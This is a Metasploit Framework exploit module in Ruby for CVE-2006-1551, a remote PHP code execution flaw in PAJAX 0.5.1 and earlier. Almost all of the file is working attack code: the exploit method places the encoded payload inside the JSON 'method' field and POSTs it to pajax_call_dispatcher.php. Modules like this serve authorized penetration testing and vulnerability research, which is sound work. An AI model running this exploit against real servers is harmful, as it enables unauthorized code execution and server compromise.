##
# $Id: pajax_remote_exec.rb 9179 2010-04-30 08:40:19Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PAJAX Remote Command Execution',
			'Description'    => %q{
					RedTeam has identified two security flaws in PAJAX (<= 0.5.1).
				It is possible to execute arbitrary PHP code from unchecked user input.
				Additionally, it is possible to include arbitrary files on the server
				ending in ".class.php".
			},
			'Author'         => [ 'Matteo Cantoni <goony[at]nothink.org>', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9179 $',
			'References'     =>
				[
					['CVE', '2006-1551'],
					['OSVDB', '24618'],
					['BID', '17519'],
					['URL', 'http://www.redteam-pentesting.de/advisories/rt-sa-2006-001.php'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Compat'      =>
						{
							'ConnectionType' => 'find',
						},
					'Space'       => 4000,
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Mar 30 2006',
			'DefaultTarget' => 0))

		register_options(
			[
				OptString.new('URI', [true, "The full URI path to pajax_call_dispatcher.php", "/pajax/pajax/pajax_call_dispatcher.php"]),
				OptString.new('MOD', [true, "The PAJAX module name", "Calculator"])
			], self.class)
	end


	def exploit

		args = %Q!{ "id": "bb2238f1186dad8d6370d2bab5f290f71", "className": "#{datastore['MOD']}", "method": "add(1,1);#{payload.encoded};$obj->add", "params": ["1", "5"] }!

		res = send_request_cgi({
			'uri'      => datastore['URI'],
			'method'   => 'POST',
			'data'     => args,
			'ctype'    => 'text/x-json'
		}, 25)

		if (res)
			print_status("The server returned: #{res.code} #{res.message}")
		else
			print_status("No response from the server")
		end
	end

end
